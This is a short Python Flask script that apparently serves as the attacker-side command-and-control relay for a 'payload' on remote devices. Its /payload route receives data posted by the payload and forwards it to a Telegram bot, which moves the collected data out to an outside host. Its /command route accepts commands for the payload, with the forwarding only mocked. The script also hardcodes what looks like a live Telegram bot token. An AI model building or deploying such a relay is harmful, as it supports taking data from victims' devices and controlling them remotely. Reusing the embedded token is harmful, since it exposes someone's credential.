from flask import Flask, request
import requests

app = Flask(__name__)

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"

# Route to handle incoming payload data
@app.route('/payload', methods=['POST'])
def handle_payload():
    # Receive data from the payload
    data = request.json
    print(f"Payload Data: {data}")

    # Send data to Telegram bot
    message = f"Received payload data: {data}"
    send_telegram_message(message)

    return "Data received", 200

# Route to send commands from Telegram bot to payload
@app.route('/command', methods=['POST'])
def send_command():
    # Receive command from Telegram bot
    command = request.json.get('command')
    print(f"Command to payload: {command}")

    # Mock sending command back to the payload
    # In reality, you'd forward the command to the device
    return f"Command '{command}' sent to payload", 200

# Function to send messages to Telegram bot
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
